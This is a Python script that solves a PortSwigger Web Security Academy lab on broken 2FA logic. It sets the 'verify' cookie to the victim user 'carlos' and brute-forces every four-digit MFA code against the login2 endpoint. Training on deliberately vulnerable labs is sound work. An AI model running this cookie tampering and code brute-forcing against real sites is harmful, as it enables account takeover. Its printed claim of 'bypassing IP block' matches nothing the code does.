'''
2FA Broken Logic
https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
'''
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

'''
Modify Cookie (victim user) and brute force authentication code
'''
def dodance(url):
    
    path = "login2"
    cookie={'session':'qfHl8QvfvnqKWyuJXasZeqpZL41EaluQ','verify':'carlos'}

    codes = ["%.4d" % i for i in range(0,10000)]
    #print (str(len(codes)))
    #print ("%s..." % codes[9999])
    for code in codes:
        params={'mfa-code':code}
        r = requests.post(url+path, data=params,cookies=cookie, verify=False, proxies=proxies)

        if "Incorrect" not in r.text and "carlos" in r.text:
            print (params)
            break


def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - Bypassing IP block")

    dodance(url)

if __name__ == "__main__":
    main()